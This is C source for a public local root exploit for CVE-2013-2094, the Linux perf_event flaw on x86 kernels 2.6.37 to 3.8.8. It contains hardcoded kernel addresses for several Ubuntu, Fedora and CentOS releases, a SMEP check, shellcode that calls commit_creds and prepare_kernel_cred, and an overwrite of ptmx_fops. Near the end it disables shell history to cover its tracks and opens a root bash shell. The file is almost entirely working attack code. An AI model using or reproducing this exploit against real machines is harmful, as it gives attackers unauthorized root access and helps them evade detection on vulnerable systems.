/*
 * CVE-2013-2094
 * Linux 2.6.37-3.8.8 (x86) - PERF_EVENT local root exploit
 * by <timhsu@chroot.org>, updated 6/21/2013
 *
 * gcc -O2 -o perf32 perf32.c
 *
 * requires System.map and /dev/ptmx
 * spender version: http://grsecurity.net/~spender/exploits/enlightenment.tgz
 * x86 version: http://zmbs.net/~rikiji/perf_ptmx.c
 * original: http://fucksheep.org/~sd/warez/semtex.c
 *
 */

#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/mman.h>
#include <stdint.h>
#include <linux/perf_event.h>
#include <asm/unistd.h>
#include <sys/uio.h>
#include <sys/utsname.h>
#include <signal.h>
       
#define SYSMAP_PREFIX "/boot/System.map-"

#define	KERNEL_START	0xc0000000
#define	SIZE		0x00100000
#define	SHELLCODE_BASE	0x10000
#define	SHELLCODE_RANGE	0x02000

unsigned long commit_creds = 0;
unsigned long prepare_kernel_cred = 0;

struct sysmap {
  
  unsigned char distrib[64];
  unsigned char kernel[64];
  unsigned long perf_swevent_enabled;
  unsigned long ptmx_fops;
  unsigned long commit_creds;
  unsigned long prepare_kernel_cred;
};

struct ptmxfunc {
  unsigned char name[32];
  unsigned long offset;
  
};

struct sysmap systemmap[] =
{

  { .distrib = "Ubuntu 11.04", 
    .kernel = "2.6.38-8-generic", 
    .perf_swevent_enabled = 0xc18fabc0, 
    .ptmx_fops = 0xc190e9c0, 
    .commit_creds = 0xc10741b0,
    .prepare_kernel_cred = 0xc1074420,
  },

  { .distrib = "Ubuntu 12.04 LTS", 
    .kernel = "3.2.0-23-generic-pae", 
    .perf_swevent_enabled = 0xc19f3b40, 
    .ptmx_fops = 0xc1a05760, 
    .commit_creds = 0xc1080440,
    .prepare_kernel_cred = 0xc10806b0,
  },
  { .distrib = "Ubuntu 13.04", 
    .kernel = "3.8.0-19-generic", 
    .perf_swevent_enabled = 0xc1a89920,
    .ptmx_fops = 0xc1a9bf40,
    .commit_creds = 0xc1072350,
    .prepare_kernel_cred = 0xc10725f0,
  },
  { .distrib = "Fedora release 18 (Spherical Cow)", 
    .kernel = "3.6.10-4.fc18.i686",
    .perf_swevent_enabled = 0xc0d81580,
    .ptmx_fops = 0xc0d94000,
    .commit_creds = 0xc0462b00,
    .prepare_kernel_cred = 0xc0462d40,

  },

  { .distrib = "CentOS release 6.4 (Final)", 
    .kernel = "2.6.32-358.el6.i686",
    .perf_swevent_enabled = 0xc0c43000,
    .ptmx_fops = 0xc0c54d80,
    .commit_creds = 0xc0481760,
    .prepare_kernel_cred = 0xc0481980,

  },

  { .distrib = "",
    .kernel = "", 
  }

};

struct ptmxfunc ptmx_api[] =
{  
  { .name = "aio_read",
    .offset = 4 * sizeof(unsigned long),
  },
  { .name = "aio_write",
    .offset = 5 * sizeof(unsigned long),
  },

  { .name = "fsync",
    .offset = 14 * sizeof(unsigned long),
  },

  { .name = "",
    .offset = 0, 
  }

};
#define OFFSET_PREP 3
#define OFFSET_COMM 10
char shellcode [] = "\x31\xc0\xbb\x04\x03\x02\x01\xff\xd3\xbb\x08\x07\x06\x05\xff\xd3\xc3";

static int
break_perf_event_open (uint32_t off) {

	struct perf_event_attr pea = {
		.type	= PERF_TYPE_SOFTWARE,
		.size	= sizeof(struct perf_event_attr),
		.config	= off,
		.mmap	= 1,
		.freq	= 1,
	};

	/*
	 * there is no wrapper for perf_event_open in glibc (on CentOS 6, at least),
	 * so you need to use syscall(2) to call it.
	 *
	 * I copied the arguments out of the kernel (with the kernel explanation of
	 * some of them) here for convenience.
	 */
	int fd = syscall(__NR_perf_event_open,
			&pea,	/* struct perf_event_attr __user *attr_uptr	  */
			   0,	/* pid_t	      pid	(target pid)	  */
			  -1,	/* int		      cpu	(target cpu)	  */
			  -1,	/* int		      group_fd	(group leader fd) */
			  0);	/* unsigned long      flags			  */

	if (fd < 0) {
	        printf(" [-] Syscall perf_event_open() failed!\n"); 		
		exit(-1);
	}

/*
	if (close(fd) != 0) {
		perror("close");
		exit(EXIT_FAILURE);
	}
*/
	return fd;
}


static int detect_smep(void)
{
	unsigned int eax, ebx, ecx, edx;

	eax = 7;
	ecx = 0;
	asm volatile("cpuid"
		: "=a" (eax),
		  "=b" (ebx),
		  "=c" (ecx),
		  "=d" (edx)
		: "0" (eax), "2" (ecx));

	if (ebx & (1 << 7)) {
		return 1;
	}
	return 0;
}

static int boot_options_nosmep(void)
{
    char s[256] = { 0 };
    int i;
    int fd;
  
    fd = open("/proc/cmdline", O_RDONLY);
    i = read(fd, s, sizeof(s));
    close(fd);
    if (strstr(s, "nosmep"))
      return 1;
    return 0;

}
unsigned long 
search_nonzero(unsigned int *addr, int size)
{
        int i;
        
        for(i = 0; i < size/sizeof(unsigned long); i++)
        {
            if (*(addr+i))
              break;
        }
        if (i < size/sizeof(unsigned long))
          return i;
        else
          return 0;

}
int
probe_structsize(unsigned long pref_table)
{
	unsigned int *map[3];
	unsigned long addr1;
	unsigned long addr2;
	unsigned long base;
	int	base_size;
	int i;
	int fd;
	int	trigger_value;

        for (i = 0; i < 3; i++)
          map[i] = NULL;

        //base = (perf_table & ~KERNEL_START) & 0x0fff0000;
        base_size = SIZE;
        for (i = 0; i < 3; i++)
        {
            
          base = (-(1024*1024*1024)/4)*((i+1)*4)+pref_table;
          base = base & 0xffff0000;
	  map[i] = mmap((void *) base, base_size,
			PROT_READ | PROT_WRITE,
			MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE,
			-1,
			0);

          printf(" [+] Mmaping[%d] 0x%x - 0x%x\n", i, (unsigned int)(base),
                                               (unsigned int)(base+base_size-1));
          if (map[i] != (void *) base) {
		printf(" [-] Unable to mmap %x\n", (unsigned int)base);
		exit(-1);
          }
	  memset(map[i], 0, base_size);

	}

	trigger_value = -(1024*1024*1024)/4;
	fd = break_perf_event_open(trigger_value);

	for(i = 0; i < 3; i++) {

	  addr1 = search_nonzero(map[i], base_size);
	  if (addr1 != 0)
	    break;
	}

	
	if (addr1 == 0) {
	        printf(" [-] Maybe no vulnerable.\n");
	        close(fd);
	        exit(-1);
	}
	close(fd);

        memset(map[i], 0, base_size);
	
	trigger_value = -(1024*1024*1024)/4;
	trigger_value = trigger_value+1;
	fd = break_perf_event_open(trigger_value);

        addr2 = search_nonzero(map[i], base_size);

	if (addr2 == 0) {
	        printf(" [-] Maybe no vulnerable\n");
	        close(fd);
	        exit(-1);
	}

        close(fd);

        for(i = 0; i < 3; i++)
        {
          if (map[i] != NULL)
            munmap(map[i], base_size);
        }        	   
             
	if (addr1 > addr2)
	  return (addr1-addr2)*sizeof(unsigned long);
        else
          return (addr2-addr1)*sizeof(unsigned long);
        
}


void ptmx_trigger(int n)
{
	struct iovec iov;
	int fd;
	int i;
	fd = open("/dev/ptmx", O_RDWR);
	if (fd < 0) {
		printf(" [-] Unable to open /dev/ptmx\n");
		exit(1);
	}
	
	iov.iov_base = &iov;
	iov.iov_len = sizeof(iov);
        switch (n)
        {
          case 0:
            i = readv(fd, &iov, 1);
            break;
          case 1:
            i = writev(fd, &iov, 1);
            break;
          case 2:
            i = fsync(fd);
            break;
        }
        
	close(fd);
}

unsigned long getsym(char * sym)
{
  char s[256] = { 0 };
  int i;
  int fd;
  
  fd = open("/proc/version", O_RDONLY);
  i = read(fd, s, sizeof(s));
  strtok(s, " ");
  strtok(NULL, " ");
  char * version = strtok(NULL, " ");
  close(fd);
  
  int len = strlen(version) + strlen(SYSMAP_PREFIX) + 1;
  char * mapf = malloc(len);
  memset(mapf, 0, len);
  strncpy(mapf, SYSMAP_PREFIX, strlen(SYSMAP_PREFIX));
  strncpy(mapf + strlen(SYSMAP_PREFIX), version, strlen(version));
  
  fd = open(mapf, O_RDONLY);
  if (fd < 0) {
    return 0;
  }
  if (fd > 0 && sym == NULL)
    return 1;
#define BUFSIZE 1024
  char * buf = malloc(BUFSIZE + 1);
  buf[BUFSIZE] = 0;
  int partial = 0, found = 0;
  char addr[9];
  
  while(!found) {
    i = read(fd, buf, BUFSIZE);    
    char * tok = strtok(buf," \n");
    
    while(tok != NULL) {
      int n = strlen(tok);
      if(partial) {
	if(strncmp(sym + partial, tok, n) == 0) {
	  found = 1;
	  break;
	} else {
	  partial = 0;	
	}
      } else {
	if(strncmp(sym, tok, n) == 0) {
	  strncpy(addr, tok - 11, 9);
	  if(n < strlen(sym) && (tok + n == buf + BUFSIZE)) {
	    partial = n;
	    break;	  
	  }
	  if(n == strlen(sym)) {
	    found = 1;
	    break;
	  }
	}
      }
      tok = strtok(NULL," \n");
    }
  }  
  close(fd);
  
//  printf("%s: 0x%s\n", sym, addr);
  return strtoul(addr, NULL, 16);  
}

int detect_systemmap(void)
{
  struct utsname u;
  int i;
  int retval = -1;
  
  uname(&u);
  for(i = 0; strcmp(systemmap[i].kernel,""); i++)
  {
    //printf("[%d] %s,%s\n", i, systemmap[i].distrib, systemmap[i].kernel);
    if (!strcmp(systemmap[i].kernel, u.release)) {
      retval = i;    
      break;
    }
  }
  return retval;

}

int detect_ptmx_api(unsigned long ptmx_fops_base, int structsize)
{
  int i;
  
  for(i = 0; ptmx_api[i].offset; i++)
  {
      if (((ptmx_fops_base + ptmx_api[i].offset) % structsize) == 0)
        return i;
  }
  return -1;
}

void sig_handler(int n)
{
}

void increment(int trigger_value, int times)
{

  int i;
  int k;
  
  signal(SIGCONT, sig_handler);
  i = 0;
#define BLOCK 256
  while(times - i > 0) {
    //printf("times=%d, i=%d, v=%d\n", times, i,times-i);
    if(times - i > BLOCK) {
      if(!fork()) {	
	for(k=0;k<BLOCK;k++){
//	  int fd = syscall(__NR_perf_event_open, &event_attr, 0, -1, -1, 0);
          int fd = break_perf_event_open(trigger_value);
	  if (fd < 0) {
	    perror("perf_event_open child");
	  }
	}
	pause();
	exit(0);
      }
      i += BLOCK;
    } else {      
//      int fd = syscall(__NR_perf_event_open, &event_attr, 0, -1, -1, 0);
      if (!fork()) {
        int fd = break_perf_event_open(trigger_value);

        if (fd < 0) {
	  perror("perf_event_open");
	  sleep(1);
        }
        pause();
        exit(0);
      }
      i++;
    }    
  }

}
int main(int argc, char ** argv, char ** envp) 
{
  int structsize;
  int i,j,k,s;
  int trigger_value;
  int newaddr;
  unsigned long perf_table;
  unsigned long ptmx_fops;
  unsigned long base;
  unsigned long base_size;
  int target;
    
  int use_ptmx_api;    
  unsigned long base_addr;
  
  printf("Linux 2.6.37-3.8.8 (x86) - PERF_EVENT local root exploit\n");   
  if (getuid() == 0) {
    printf(" [!] You're root!!\n");
    perf_table = getsym("perf_swevent_enabled");
    commit_creds = getsym("commit_creds");
    prepare_kernel_cred = getsym("prepare_kernel_cred");
    ptmx_fops = getsym("ptmx_fops");
    printf(".perf_swevent_enabled = 0x%x\n", (unsigned int)perf_table);
    printf(".ptmx_fops = 0x%x\n", (unsigned int)ptmx_fops);
    printf(".commit_creds = 0x%x\n", (unsigned int)commit_creds);
    printf(".prepare_kernel_cred = 0x%x\n", (unsigned int)prepare_kernel_cred);
    exit(0);    
  }
  i = getsym(NULL);
  if (i == 0) {
    printf(" [!] Unable to access System.map\n");

    i = detect_systemmap();
    if (i < 0) {
      printf(" [-] No suitable System.map found.\n");
      exit(0);
    
    } else {
      printf(" [+] Detected [%s - %s]\n", systemmap[i].distrib, systemmap[i].kernel);
      perf_table = systemmap[i].perf_swevent_enabled;
      commit_creds = systemmap[i].commit_creds;
      prepare_kernel_cred = systemmap[i].prepare_kernel_cred;
      ptmx_fops = systemmap[i].ptmx_fops;
    }
    
  } else {
    printf(" [+] Using System.map\n");
    perf_table = getsym("perf_swevent_enabled");
    commit_creds = getsym("commit_creds");
    prepare_kernel_cred = getsym("prepare_kernel_cred");
    ptmx_fops = getsym("ptmx_fops");
    printf(" [+] Using perf_swevent_enabled = 0x%x\n", (unsigned int)perf_table);
    printf(" [+] Using ptmx_fops = 0x%x\n", (unsigned int)ptmx_fops);
    printf(" [+] Using commit_creds = 0x%x\n", (unsigned int)commit_creds);
    printf(" [+] Using prepare_kernel_cred = 0x%x\n", (unsigned int)prepare_kernel_cred);
  
  }

  structsize = probe_structsize(perf_table);
  printf(" [+] Detected structsize = %d\n", structsize);
  if (detect_smep()) {
    
    if (!boot_options_nosmep()) {
      printf(" [-] SMEP detected! Failed.\n");
      exit(0);
    } else {
      printf(" [!] CPU SMEP detected, but disabled.\n");    
    }
  }

  use_ptmx_api = detect_ptmx_api(ptmx_fops, structsize);
  printf(" [+] Choose ptmx_fops->%s", ptmx_api[use_ptmx_api].name);
  target = ptmx_fops + ptmx_api[use_ptmx_api].offset;
  printf(" (0x%x)\n", target);
  
//  exit(0);
  
  *((unsigned int *)(shellcode + OFFSET_PREP)) = prepare_kernel_cred;
  *((unsigned int *)(shellcode + OFFSET_COMM)) = commit_creds;

  printf(" [+] Searching trigger value, Please wait ...\n");
  for(i = -(1024*1024*256); i < 0; i--) 
  {
    trigger_value = i;
		
    if (trigger_value * structsize + (unsigned int)perf_table == (unsigned int)(target))
    {
      printf(" [+] Found trigger value = 0x%x\n", trigger_value);
      break;
    }
  }
  if (i >= 0) {
      printf(" [-] No tigger value found, failed\n");
      exit(0);
  }
  
  base_addr = SHELLCODE_BASE;

  char * map = mmap((void *)base_addr, SHELLCODE_RANGE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_FIXED | MAP_SHARED, -1, 0);
    
  if(map == MAP_FAILED) {
    printf(" [-] Unable to mmap 0x%x for shellcode\n", (unsigned int)base_addr);
    //perror("mmap");    
    exit(0);
  }
  printf(" [+] Copy shellcode to 0x%x\n", (unsigned int)map);
  memset(map, 0x90, SHELLCODE_RANGE);  
  memcpy(map+SHELLCODE_RANGE-0x50, shellcode, 0x30);

  printf(" [+] Try to modify ptmx_fops->%s to 0x%x\n", 
    ptmx_api[use_ptmx_api].name, (unsigned int)base_addr);
  
  increment(trigger_value, base_addr);
  
  sleep(1);    
  printf(" [+] Call ptmx_fops->%s\n", ptmx_api[use_ptmx_api].name);
  ptmx_trigger(use_ptmx_api);

  kill(0, SIGCONT);
  
  if(getuid() != 0) {
    printf(" [-] Failed!");
    return -1;
  }
  printf(" [+] Got root!!\n");
  
  setenv("HISTFILE","/dev/null",1);  
  execl("/bin/bash","bash",NULL);

  return 0;
}
